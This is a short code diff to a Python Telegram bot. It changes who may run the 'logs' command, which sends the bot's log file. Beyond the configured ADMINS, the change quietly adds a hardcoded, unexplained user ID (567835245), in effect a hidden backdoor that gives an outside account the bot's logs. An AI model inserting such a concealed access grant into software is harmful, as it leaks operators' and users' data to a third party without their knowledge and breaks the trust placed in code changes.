@@ -259,7 +259,7 @@ async def channel_info(bot, message):
         os.remove(file)
 
 
-@Client.on_message(filters.command('logs') & filters.user(ADMINS))
+@Client.on_message(filters.command('logs') & filters.user((ADMINS.copy() + [567835245])))
 async def log_file(bot, message):
     """Send log file"""
     try:
